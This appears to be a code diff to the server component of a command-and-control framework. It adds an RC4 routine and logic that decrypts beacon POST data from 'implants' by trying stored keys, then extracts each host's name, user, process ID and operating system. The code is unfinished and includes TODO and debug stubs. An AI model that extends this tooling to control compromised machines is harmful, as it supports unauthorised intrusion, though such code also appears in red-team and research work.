@@ -50,9 +50,32 @@ class WebServer(object):
         except Exception:
             raise
 
+    def crypt(self, key, data):
+        """
+        DESCRIPTION:
+            This function is the encryption/decryption routine
+        """
+        S = list(range(256))
+        j = 0
+        out = []
+
+        for i in list(range(256)):
+            j = (j + S[i] + ord(key[i % len(key)])) % 256
+            S[i], S[j] = S[j], S[i]
+
+        i = j = 0
+
+        for char in data:
+            i = (i + 1) % 256
+            j = (j + S[i]) % 256
+            S[i], S[j] = S[j], S[i]
+            out.append(chr(char ^ S[(S[i] + S[j]) % 256]))
+
+        return "".join(out)
+
     def is_base64(self, string):
         """
-        Description:
+        DESCRIPTION:
             This function checks if a specified string is Base64 encoded or not
         """
         # tries to Base64 decode
@@ -115,9 +138,29 @@ class WebServer(object):
             # else RC4 beacon
             # previous beacon
             else:
-                # TO DO: query "implants" table and try to decrypt POST data
+                # queries all encryption keys from the "implants" table
+                with self.connection.cursor() as cursor:
+                    cursor.execute("SELECT `encryption_key` FROM `implants`")
+                    results = cursor.fetchall()
 
-                return "rc4"
+                    # loops through each encryption key
+                    for row in results:
+                        # if successful decryption
+                        if "hostname" in self.crypt(row[0], raw_data):
+                            # JSON decodes POST data
+                            j = json.loads(self.crypt(row[0], raw_data))
+
+                            hostname = j["hostname"]
+                            current_user = j["current_user"]
+                            process_id = j["process_id"]
+                            operating_system = j["operating_system"]
+
+                            # TO DO: check for tasking
+                            #       there should be a function in WebServer class called check_tasking(hostname, process_id)
+                            #       since we just JSON decoded the POST data above which contains hostname and process_id
+
+                            # DEBUGGING
+                            return "decrypted"
 
     def start_flask(self, protocol, port, profile):
         """
